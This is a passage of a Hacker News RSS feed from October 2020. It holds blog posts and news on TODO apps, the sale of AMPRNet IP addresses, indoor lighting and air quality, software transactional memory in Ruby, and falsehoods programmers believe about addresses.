<li>Sometimes humans need help. A&nbsp;little nudge here and&nbsp;there can make a&nbsp;huge difference. It‚Äôs also very personal: different things work for&nbsp;different types of&nbsp;people. I‚Äôve made a&nbsp;list of&nbsp;strategies to&nbsp;help me get things done, and&nbsp;ended up with 13 items (things like ‚Äúextract the&nbsp;next smallest step as&nbsp;a&nbsp;separate task‚Äù or&nbsp;‚Äúwork on&nbsp;it for&nbsp;just 2 minutes‚Äù). Thirteen! Guess how many nudges all my TODO apps have? Zero (except the&nbsp;deadline push notification reminder which just adds anxiety).</li>
</ol>
<ol start="7">
<li>Context is important. We are tired in&nbsp;the&nbsp;evening and&nbsp;have less willpower. <a href="https://www.youtube.com/watch?v=GmFwRkl-TTc">Getting a&nbsp;small task done first thing in&nbsp;the&nbsp;morning can boost our confidence and&nbsp;energy levels</a>. Work tasks are better be hidden during the&nbsp;weekend. Sophisticated TODO apps have the&nbsp;flexibility to&nbsp;do this, but&nbsp;they require a&nbsp;lot of&nbsp;investment in&nbsp;configuration</li>
</ol>
<p>I now see all TODO apps as&nbsp;a&nbsp;shallow copy-pasta of&nbsp;the&nbsp;same rigid, inhuman, anxiety-inducing template.</p>
<p>But&nbsp;there‚Äôs hope!</p>
<p>In&nbsp;fact the&nbsp;advanced solution technology lies in&nbsp;the&nbsp;hands of&nbsp;productivity enemies: social media apps and&nbsp;games. Instagram, TikTok and&nbsp;Candy Crush have figured all this out. They know how to&nbsp;make you do something with very little willpower. They know how to&nbsp;present information in&nbsp;a&nbsp;way that‚Äôs not&nbsp;overwhelming. They give you rewards for&nbsp;doing things. Hints, nudges, suggestions.</p>
<p>I think there‚Äôs plenty of&nbsp;room for&nbsp;TODO innovations.</p>
<p>As&nbsp;for&nbsp;me -- I‚Äôm not&nbsp;registering a&nbsp;domain name for&nbsp;a&nbsp;new pet project. Not&nbsp;yet :)</p>
</div></div>]]>
            </description>
            <link>https://blog.frantic.im/all/todo-apps-are-meant-for-robots/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927203</guid>
            <pubDate>Thu, 29 Oct 2020 04:26:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sale of Amateur Radio AMPRnet TCP/IP Addresses Raised $108M]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24927037">thread link</a>) | @todsacerdoti
<br/>
October 28, 2020 | https://www.icqpodcast.com/news/2020/10/25/sale-of-amateur-radio-amprnet-tcpip-addresses-raised-108m | <a href="https://web.archive.org/web/*/https://www.icqpodcast.com/news/2020/10/25/sale-of-amateur-radio-amprnet-tcpip-addresses-raised-108m">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-7b3dd6c3950208794ea7"><div><p>President of Amateur Radio Digital Communications (ARDC) has confirmed they received $108 million from Amazon for 4 million amateur radio TCP/IP addresses </p><p>Since its allocation to Amateur Radio in the mid-1980s, Internet network 44 (44.0.0.0/8), known as the AMPRNet‚Ñ¢, has been used by amateur radio operators to conduct scientific research and to experiment with digital communications over the radio with a goal of advancing the state of the art of Amateur Radio networking, and to educate amateur radio operators in these techniques.</p><p>Amateur Radio Digital Communications (ARDC) is a non-profit California corporation formed to further these goals.</p><p>In mid-2019 a block (44.192.0.0/10) of approximately four million AMPRNet‚Ñ¢ IP addresses, out of the 16 million available, was sold to Amazon by ARDC but it is only now that the sale price has been released. Amazon paid $27 for each IPv4 address.</p></div></div></div>]]>
            </description>
            <link>https://www.icqpodcast.com/news/2020/10/25/sale-of-amateur-radio-amprnet-tcpip-addresses-raised-108m</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927037</guid>
            <pubDate>Thu, 29 Oct 2020 03:57:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to walk upright and stop living in a cave]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24927008">thread link</a>) | @taylorlunt
<br/>
October 28, 2020 | https://taylor.gl/blog/9/ | <a href="https://web.archive.org/web/*/https://taylor.gl/blog/9/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    
    <div>
      
<p>
<a href="https://taylor.gl/">Home</a>

  
  
  <a href="https://taylor.gl/"> </a>

  
  
  ¬ª
  
  <a href="https://taylor.gl/blog/"> Blog</a>

</p>

<p><span>
  Reading time: 9 minutes.

  Written in 2020.
</span></p>

<p>Call me arrogant, but I‚Äôd rather optimize my indoor environment than try to spend more time in the capricious outdoors. I think it‚Äôs defeatism to give up on improving our indoor spaces and resign ourselves to the fickle weather and seasons. </p>
<p>If I was going to create an ideal environment for a human, I think there are several things I would include that we routinely fail to include in our homes and offices.</p>
<h3 id="lighting">Lighting</h3>
<p>Our indoor lighting situation usually sucks. The fact that ‚Äúnatural lighting‚Äù is a selling point in real estate shows how terrible a job we are doing in this department. We rely on the sun naturally providing us with sufficient light, and if it‚Äôs an overcast day or the days have grown shorter in the winter, then I guess we‚Äôre shit out of luck. </p>
<p>Usually, indoor areas are around 50-500 lux. This is hundreds of times dimmer than the sunlight. Clearly, we weren‚Äôt designed to thrive in such dim environments, and science does verify a connection between brighter light and alertness. If we don‚Äôt want to be sleepy like it‚Äôs nighttime, we shouldn‚Äôt light our rooms like it‚Äôs nighttime. For some, the effects of dim lighting go beyond simple lethargy and, especially in the winter, cause serious mood problems like seasonal affective disorder or the winter blues. This is common, but it‚Äôs not necessary. Bright light, particularly blue light, can also generally boost mood and may be a comparable stimulant to caffeine. (Those who are prone to mania should be careful, as intense light can trigger mania or hypomania in those predisposed.) Brighter lighting can also help circadian rhythm issues (which I, for example, have struggled with for years), both by entraining your circadian rhythm so your body better knows when it‚Äôs day, and by shortening it if it‚Äôs too long. </p>
<p>Lighting isn‚Äôt as expensive as it used to be, so we can do better than we have in the past. The cost of electricity for LED lighting is now negligible, and the only real factor is the cost of the bulbs themselves. Reaching for the full 100,000 lux of sunlight would still be prohibitively expensive, but going for at least 10,000 lux is doable with only a few hundred dollars. I won‚Äôt go into specifics here, but you can get more information on specific lighting setups <a href="https://www.lesswrong.com/posts/hC2NFsuf5anuGadFm/how-to-build-a-lumenator">here</a> or <a href="https://meaningness.com/metablog/sad-light-lumens">here</a>. In particular, get bulbs with a color temperature close to sunlight (5600k), but make sure the bulbs have a <span>good<span>good means 90+</span></span> Color Rendering Index (CRI), otherwise the light will feel harsh.</p>
<p>I recommend putting any bright lighting you buy for your home on electrical timers so you don‚Äôt accidentally leave them on during the evening and screw up your sleep. You may also want to set your phone/computer brightness on a timer, if you can. The goal is to mimic the natural day/night cycle of our evolutionary environment, but without all the pesky volatility of nature. You can get programs like f.lux too, which reduce the amount of blue light emitted by your device in the evening, but in my experience this isn‚Äôt good enough and reducing the actual brightness of the device at night is also important.</p>
<p>‚ÄúBut what about vitamin D? Just go outside!‚Äù This is terrible advice, and I hear it too often. Sunlight is a powerful carcinogen, and vitamin D supplements are not, and they‚Äôre cheap. </p>
<h3 id="carbon-dioxide">Carbon dioxide</h3>
<p>Carbon MON-oxide is the deadly one you probably already have a monitor for in your house. Carbon DI-oxide is the feeble cousin of carbon monoxide, but it still has a negative effect on human health: <span>high (but common)<span>1,000 ppm or higher</span></span> levels impairs our ability to think. Just what you don‚Äôt want in an office. High levels may also have a negative long-term impact in other areas of our health. </p>
<p>Hold your breath. When it sucks and you decide to start breathing again, it‚Äôs carbon dioxide buildup, not lack of oxygen, causing you to feel panic and the need to breath. Carbon dioxide is a toxin. And we breath it out into poorly ventilated rooms, where the levels can rise to double or triple what they are <span>outdoors<span>around 400 ppm</span></span>.</p>
<p>Several studies have shown significant (temporary) cognitive impairments due to carbon dioxide levels over 1,000 ppm, but such levels are <span>common<span>I recently bought a carbon dioxide meter and found such levels in my home.</span></span> in poorly ventilated shared spaces. Fortunately, the solution is simple: open a window. Unfortunately, this doesn‚Äôt work when it‚Äôs raining, or when it‚Äôs too hot outside, or when it‚Äôs too cold outside‚Ä¶ In particular, I have to contend with Canadian winters, which means opening the window is a valid strategy for a minority of the year unless I buy an expensive heat recovery ventilator. I don‚Äôt have a good solution for mitigating carbon dioxide buildup in the winter. Let me know if you do.</p>
<p>And, by the way, plants won‚Äôt work. They won‚Äôt suck up nearly enough carbon dioxide. You would need hundreds of plants per person, or roughly a dozen full-size trees per person, to offset the carbon dioxide exhaled by humans in a room.</p>
<p>A fun fact: if we don‚Äôt stop pumping carbon dioxide into the atmosphere, then in about a century, carbon dioxide <em>outdoors</em> may reach cognitively impairing levels. Then what do we do? </p>
<h3 id="temperature-and-humidity">Temperature and Humidity</h3>
<p>High/low humidity and high/low temperature both lead to discomfort and lower scores on concentration measures. People generally have temperature under control, or at least it‚Äôs something they‚Äôre aware of. Humidity is less common to measure, but a $10 hygrometer should help you get your indoor space to the ideal 30-50% humidity range if it isn‚Äôt already. Air conditioners also tend to reduce humidity as well as temperature, so air-condition in the summer and use a humidifier in the winter.</p>
<p>At night, drop the temperature a few degrees if you can; It‚Äôs easier to sleep in a cool room. I wonder how many hours of sleep have been reclaimed already due to the advent of smart thermostats.</p>
<h3 id="background-noise">Background Noise</h3>
<p>I imagine this factor is more subjective than the others, but too loud is distracting, even aggrivating; too quiet makes your sniffles and sighs painfully audible to others, and so is distracting. Uneven background noise like traffic is worse than the uniform background noise of white noise or trickling water. Bad background noise leads to poorer cognition and focus.</p>
<p>It‚Äôs easy to be bothered by noise and not realize it until the noise stops and a wave of relief finally makes you aware of how annoyed you were by the sound. Noise issues are happily easy to control: earplugs or noise-cancelling headphones will generally do the trick. It would be utopic to eliminate bothersome noise from the environment altogether, but it‚Äôs not necessary. </p>
<h3 id="segregation-of-activities">Segregation of Activities</h3>
<p>A heroin addict who normally takes their dose in their car decides one day to inject in their bathroom. They die of an overdose, even though they took the same amount they normally do. Why? Our brains maintain associations with different environments. If you normally inject heroin when you get in your car, then your body starts to prepare you for the drug as soon as you get in the car. Drug tolerance, then, is partly environmental. (This <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1196296/">actually happened</a> and happens regularly.) Your mind and body are affected by your environment due to Pavlovian conditioning. When the bell rings, the dog salivates. When the lunch bell rings, so do you. </p>
<p>One common piece of advice given by doctors to insomniacs is to only use your bed for sleeping and for sex, and it‚Äôs good advice. If you use your bed for reading, studying, and watching TV, then your mind will not form a strong association between the bed and sleep, and you will have a harder time falling asleep. </p>
<p>Likewise, if you do all your slacking off at the same desk you do your work at, you will probably have a harder time focusing. Even having your smartphone within your field of view while you work has been shown to reduce focus. So it wouldn‚Äôt hurt to have different areas for work and play, and to not eat at your desk. (And even different user accounts on your computer for work and non-work, if you don‚Äôt find that idea to be a pain in the ass like I do.)</p>
<p>We also form associations not just with space, but with time. Hence another piece of common sleep hygeine advice: go to sleep at the same time every night. Your body will learn to expect sleep at that time. Likewise, people who eat at the same time every day eat with their bodies prepared to receive food, and so are less likely to become obese. Studies have shown this. Unfortunately, setting every aspect of your life to a clock can make you feel like a robot, so I usually don‚Äôt tolerate such rigidity in my life. But it‚Äôs worth thinking about.</p>
<h3 id="conclusion">Conclusion</h3>
<ul>
<li>Brighter lights for your poor eyes</li>
<li>Better ventilation for your poor lungs</li>
<li>Optimal temperature and humidity for your poor skin</li>
<li>Less distracting background noise for your poor ears</li>
<li>Activity-specific areas for your poor brain</li>
</ul>
<p>I also think the aesthetics of most of our indoor environments could use an upgrade, but I don‚Äôt have much to say on the subject besides simply saying so. (Though I would bet: green lush &gt; grey drab.)</p>
<p>We sometimes act like we are just <span>machines<span>caffeine in ‚ü∂ code out</span></span>, but we are not. We‚Äôre mushy creatures with delicate bodies and delicate minds, too. And we evolved for one specific environment. There is no guarantee that the indoor environment which is cheapest to produce is going to be just as good for us as a bespoke imitation of our evolutionary environment, and in fact it is not. I think life would be more pleasant if people took these factors more serously when designing indoor environments, and our work would be more efficient and less prone to mistakes.</p>


    </div>
  </section></div>]]>
            </description>
            <link>https://taylor.gl/blog/9/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927008</guid>
            <pubDate>Thu, 29 Oct 2020 03:52:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA['Digital natives' first generation with a lower IQ than their parents]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24926594">thread link</a>) | @respinal
<br/>
October 28, 2020 | https://moneytrainingclub.com/2020/10/28/alarming-trend-between-digital-natives-and-their-iq-digital-trends-spanish/ | <a href="https://web.archive.org/web/*/https://moneytrainingclub.com/2020/10/28/alarming-trend-between-digital-natives-and-their-iq-digital-trends-spanish/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://moneytrainingclub.com/2020/10/28/alarming-trend-between-digital-natives-and-their-iq-digital-trends-spanish/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926594</guid>
            <pubDate>Thu, 29 Oct 2020 02:51:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Context on STM in Ruby]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24926537">thread link</a>) | @kposehn
<br/>
October 28, 2020 | https://chrisseaton.com/truffleruby/ruby-stm/ | <a href="https://web.archive.org/web/*/https://chrisseaton.com/truffleruby/ruby-stm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<header>

<h2><a href="https://chrisseaton.com/">Chris Seaton</a>, 28 October 2020</h2>


</header>

<p>There‚Äôs a proposal to add <em>Software Transactional Memory</em>, or <em>STM</em>, to the Ruby programming language. This is part of a wider effort to add better support for concurrency and parallelism in Ruby, and in particular the idea of <em>ractors</em>. A concept has been <a href="https://bugs.ruby-lang.org/issues/17261">proposed</a> and <a href="https://github.com/ruby/ruby/pull/3652">implemented</a> by Koichi Sasada.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/testBoard.gif" width="50%">
<figcaption>An animation of the algorithm we're going to use as an example of STM - we'll explain this later on</figcaption>
</figure>

<p>This article gives some context on what STM is, how you use it, and why you might want to use it. We‚Äôll show an application which is well-suited to STM and we‚Äôll use this to talk about the benefits, issues, and some open questions.</p>

<p>We‚Äôll finish by setting a challenge for STM in Ruby.</p>

<p>I wrote the first half of my PhD on STM, and the second half on Ruby, so I‚Äôve got quite a bit of experience with both and the idea of their combination is very interesting to me.</p>

<h2 id="why-might-we-want-an-stm">Why might we want an STM?</h2>

<p>Let‚Äôs say we‚Äôre a bank managing many bank accounts. Each account has a total. We get a never-ending stream of requests to move a sum of money <code>m</code> from an account <code>a</code> to account <code>b</code>.</p>

<div><div><pre><code><span>loop</span> <span>do</span>
  <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
  <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
  <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
<span>end</span>
</code></pre></div></div>

<p>Something not everyone may know about Ruby is that <code>x += y</code> is equivalent to writing <code>t = x; x = t + y</code>. We‚Äôll write that out in full to make that clear to ourselves.</p>

<div><div><pre><code><span>loop</span> <span>do</span>
  <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
  <span>a_balance</span> <span>=</span> <span>accounts</span><span>[</span><span>a</span><span>]</span>
  <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>a_balance</span> <span>-</span> <span>m</span>
  <span>b_balance</span> <span>=</span> <span>accounts</span><span>[</span><span>b</span><span>]</span>
  <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>=</span> <span>b_balance</span> <span>+</span> <span>m</span>
<span>end</span>
</code></pre></div></div>

<p>We‚Äôve got a lot of transfers to run through, so we‚Äôll have multiple threads processing these transfers.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>a_balance</span> <span>=</span> <span>accounts</span><span>[</span><span>a</span><span>]</span>
      <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>a_balance</span> <span>-</span> <span>m</span>
      <span>b_balance</span> <span>=</span> <span>accounts</span><span>[</span><span>b</span><span>]</span>
      <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>=</span> <span>b_balance</span> <span>+</span> <span>m</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>We‚Äôve got a few problems here now. With all these threads running at the same time, what happens if two threads are putting money into your account concurrently?</p>

<div><div><pre><code><span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>100</span>

<span># thread 1                        # thread 2</span>
<span>balance</span> <span>=</span> <span>accounts</span><span>[</span><span>a</span><span>]</span>
  <span># balance = 100</span>
                                  <span>balance</span> <span>=</span> <span>accounts</span><span>[</span><span>a</span><span>]</span>
                                    <span># balance = 100</span>
<span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>balance</span> <span>+</span> <span>10</span>
  <span># accounts[a] = 110</span>
                                  <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>=</span> <span>balance</span> <span>+</span> <span>10</span>
                                    <span># accounts[a] = 110</span>
</code></pre></div></div>

<p>The two transfers have run, but your balance is 110. The other 10 has been lost - this is called a <em>lost update</em>, meaning it‚Äôs as if the update was never made.</p>

<p>Also consider what happens if the thread crashes after taking money from <code>a</code> but before putting it into <code>b</code>? The transfer would be applied partially and again we‚Äôd lose money.</p>

<p>We need to use some kind of <em>synchronization</em> on our accounts. Ruby has <em>mutual exclusion locks</em> or <em>mutexes</em>, so we can try using those.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>locks</span><span>[</span><span>a</span><span>].</span><span>synchronize</span> <span>do</span>
        <span>locks</span><span>[</span><span>b</span><span>].</span><span>synchronize</span> <span>do</span>
          <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
          <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
        <span>end</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Does this work? What if we process a transfer from account 1001 to account 1002 on one thread at the same time as processing a transfer from account 1002 to 1001, so the other way around, at the same time?</p>

<p>The first thread will try to lock 1001 and then 1002. The second thread will try to lock 1002 and then 1001. If the first thread gets as far as locking 1001, and the second as far as locking 1002, then both will be waiting for the opposite lock and will never release the lock they already have. We will be in <em>deadlock</em>.</p>

<p>If we always acquired locks in the same order, by collecting them up first and sorting them, we could fix this.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>x</span><span>,</span> <span>y</span> <span>=</span> <span>[</span><span>a</span><span>,</span> <span>b</span><span>].</span><span>sort</span>
      <span>locks</span><span>[</span><span>x</span><span>].</span><span>synchronize</span> <span>do</span>
        <span>locks</span><span>[</span><span>y</span><span>].</span><span>synchronize</span> <span>do</span>
          <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
          <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
        <span>end</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Now in both transfers account 1001 is locked first and 1002 is locked second. That will work.</p>

<p>We have to make up a somewhat artificial requirement to explain the next issue, but consider if for some good reason we wanted to transfer to one account if we had a lot of money, and a different account if we only had a little money. Maybe if we‚Äôre rich this month we donate to charity, otherwise we unfortunately need to save for ourselves.</p>

<div><div><pre><code>if account balance &gt; 1000
  transfer 10 to charity
else
  transfer 10 to savings
end
</code></pre></div></div>

<p>We‚Äôll talk about accounts <code>a</code>, <code>b</code>, and <code>c</code>, now, and a threshold of money <code>t</code>.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>,</span> <span>t</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>x</span><span>,</span> <span>y</span><span>,</span> <span>z</span> <span>=</span> <span>[</span><span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>].</span><span>sort</span>
      <span>locks</span><span>[</span><span>x</span><span>].</span><span>synchronize</span> <span>do</span>
        <span>locks</span><span>[</span><span>y</span><span>].</span><span>synchronize</span> <span>do</span>
          <span>locks</span><span>[</span><span>z</span><span>].</span><span>synchronize</span> <span>do</span>
            <span>if</span> <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>&gt;</span> <span>t</span>
              <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
              <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
            <span>else</span>
              <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
              <span>accounts</span><span>[</span><span>c</span><span>]</span> <span>+=</span> <span>m</span>
            <span>end</span>
          <span>end</span>
        <span>end</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>It‚Äôs starting to get very complicated. And this locks more than it needs to - it locks both <code>b</code> and <code>c</code> but then only uses one of them. If you use <code>b</code> in the end, ideally another thread could be serving a transfer to <code>c</code> at the same time, but you‚Äôve locked it and it can‚Äôt. Imagine if instead of two potential accounts it was thousands and you had to lock them all. Imagine if you couldn‚Äôt work out at all which account you‚Äôd be transferring to until you started the transfer - then you‚Äôd never be able to process two transfers at the same time.</p>

<p>At this point as well we‚Äôre likely to start to make errors trying to do all this locking and ordering of locks and things.</p>

<p>Stepping back and taking it all in, we can draw up some requirements for what we need.</p>

<ul>
  <li><em>atomicity</em> - that all writes in the transfer are applied or none are applied</li>
  <li><em>consistency</em> - meaning that our data structures are always valid - the total sum of money never changes</li>
  <li><em>isolation</em> - meaning one transfer does not interfere with another</li>
  <li><em>durability</em> - meaning that when applied the transfer is available to all subsequent transactions</li>
</ul>

<p>Ideally a library or the language could do this all for us. We‚Äôd like to be able to write almost what we originally wrote, but with just an annotation to make the code inside a block atomic, consistent, isolated, and the result durable.</p>

<div><div><pre><code><span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Thread</span><span>.</span><span>new</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>atomically</span> <span>do</span>
        <span>accounts</span><span>[</span><span>a</span><span>]</span> <span>-=</span> <span>m</span>
        <span>accounts</span><span>[</span><span>b</span><span>]</span> <span>+=</span> <span>m</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>This is what a <em>transactional</em> memory can let us do. It will automatically monitor what you read and write inside the <code>atomically</code> block, which is a <em>transaction</em>, and will make sure it is either applied fully or not, that the balance of the whole system is always consistent, that transactions do not see the result of each other partially applied, and that writes appear and stay.</p>

<p>It may be implemented using the code we eventually arrived at ourselves, or it could do something else instead. In practice how it is often implemented is that
reads and writes are stored in a log, then at the end the transaction works out if anyone else has written locations that you‚Äôve read. If they have then the values you read are no longer valid, so your transaction <em>conflicts</em> with another, is <em>aborted</em> and retries, reading the locations again. When it eventually does not conflict with any other transactions it is <em>committed</em> and succeeds. This means you don‚Äôt need to lock everything up-front, which means you avoid the problem of what happens if you may potentially need every account. Locking everything up-front is called <em>pessimistic locking</em>. We‚Äôre moving to <em>optimistic locking</em></p>

<h2 id="the-proposed-stm">The proposed STM</h2>

<p>Koichi‚Äôs <a href="https://bugs.ruby-lang.org/issues/17261">proposed</a> STM for Ruby, in combination with his proposed <em>ractors</em> (similar to <em>actors</em>) would look like this.</p>

<div><div><pre><code><span>accounts</span> <span>=</span> <span>9999</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>{</span> <span>Thread</span><span>::</span><span>TVar</span><span>.</span><span>new</span><span>(</span><span>100</span><span>)</span> <span>}</span>

<span>n</span><span>.</span><span>times</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span> <span>*</span><span>accounts</span> <span>do</span> <span>|*</span><span>accounts</span><span>|</span>
    <span>loop</span> <span>do</span>
      <span>a</span><span>,</span> <span>b</span><span>,</span> <span>m</span> <span>=</span> <span>get_next_transfer</span>
      <span>Thread</span><span>.</span><span>atomically</span> <span>do</span>
        <span>accounts</span><span>[</span><span>a</span><span>].</span><span>value</span> <span>-=</span> <span>m</span>
        <span>accounts</span><span>[</span><span>b</span><span>].</span><span>value</span> <span>+=</span> <span>m</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>He‚Äôs using a <code>Ractor</code> but you can think of it as a thread for the purposes of this article. Instead of an array of account balances, we now have an array of <code>TVar</code> objects that contain values. A <code>TVar</code> is a <em>transactional variable</em>. Only these variables are transactional - not any other Ruby value you read or write. His design requires that the <code>TVar</code> objects you‚Äôre going to use are passed into the <code>Ractor</code>, due to rules about sharing that aren‚Äôt relevant for this article.</p>

<p>This looks good, doesn‚Äôt it!</p>

<h2 id="a-more-complex-application">A more complex application</h2>

<p>Let‚Äôs consider a larger application, in order to illustrate further and to talk about some issues and open questions. The <a href="https://github.com/chrisseaton/ruby-stm-lee-demo">code is available on GitHub</a>.</p>

<p>Let‚Äôs say it‚Äôs our job to lay out the wires on a circuit board. We get a board with <em>pads</em> (connections to components mounted on the board) and a list of <em>routes</em> that we need to draw between these pads. There are a great many pads and routes, there isn‚Äôt much space on the tiny board, and another catch is that it‚Äôs very expensive to have wires crossing each other. Let‚Äôs say it‚Äôs exponentially more expensive for more deeply stacked wires.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/minimal.svg" width="25%">
<figcaption>A minimal board and a solution</figcaption>
</figure>

<p>In this minimal example we we can see two routes, and how they have to cross each other.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/mainboard.svg" width="50%">
<figcaption>A processor module board and a solution</figcaption>
</figure>

<p>This example is a processor module and shows what kind of scale we might want to be working at. This board has many longer routes which are more likely to conflict.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/memboard.svg" width="50%">
<figcaption>A memory module board and a solution</figcaption>
</figure>

<p>This example is a memory module. It has many shorter routes which we may expect to conflict less.</p>

<figure>
<img src="https://chrisseaton.com/truffleruby/ruby-stm/testBoard.svg" width="50%">
<figcaption>The test board we'll use and a solution</figcaption>
</figure>

<p>We‚Äôll use this test board, which is somewhere between all these extremes.</p>

<p>There‚Äôs an algorithm to lay each routes, and it actually produces an optimal solution for an individual route, but not for all routes. It‚Äôs called <em>Lee‚Äôs algorithm</em> and was published back in 1960. We‚Äôll ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chrisseaton.com/truffleruby/ruby-stm/">https://chrisseaton.com/truffleruby/ruby-stm/</a></em></p>]]>
            </description>
            <link>https://chrisseaton.com/truffleruby/ruby-stm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926537</guid>
            <pubDate>Thu, 29 Oct 2020 02:41:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Falsehoods programmers believe about addresses (2013)]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 62 (<a href="https://news.ycombinator.com/item?id=24926417">thread link</a>) | @gk1
<br/>
October 28, 2020 | https://www.mjt.me.uk/posts/falsehoods-programmers-believe-about-addresses/ | <a href="https://web.archive.org/web/*/https://www.mjt.me.uk/posts/falsehoods-programmers-believe-about-addresses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Perhaps you've read posts like <a href="http://www.kalzumeus.com/2010/06/17/falsehoods-programmers-believe-about-names/">Falsehoods Programmers Believe About Names</a>
and <a href="http://infiniteundo.com/post/25326999628/falsehoods-programmers-believe-about-time">Falsehoods programmers believe about time</a>.
Maybe you've also read <a href="http://wiesmann.codiferes.net/wordpress/?p=15187&amp;lang=en">Falsehoods programmers believe about geography</a>.</p>

<p>Addressing is a fertile ground for incorrect assumptions, because everyone's used to dealing with addresses and 99% of the time they seem so simple.
Below are some incorrect assumptions I've seen made, or made myself, or had reported to me.
(If you want to look up an address for a UK postcode or vice-versa to confirm what I'm telling you, try the <a href="http://www.royalmail.com/postcode-finder/">Royal Mail Postcode Finder</a>)</p>

<!-- Composition of building numbers -->

<ul>
<li><p><strong>An address will start with, or at least include, a building number.</strong></p>

<p>Counterexample: Royal Opera House, Covent Garden, London, WC2E 9DD, United Kingdom.</p></li>
<li><p><strong>When there is a building number, it will be all-numeric.</strong></p>

<p>Counterexample: 1A Egmont Road, Middlesbrough, TS4 2HT</p>

<p>4-5 Bonhill Street, London, EC2A 4BX</p></li>
<li><p><strong>No buildings are numbered zero</strong></p>

<p>Counterexample: 0 Egmont Road, Middlesbrough, TS4 2HT</p></li>
<li><p><strong>Well, at the very least no buildings have negative numbers</strong></p>

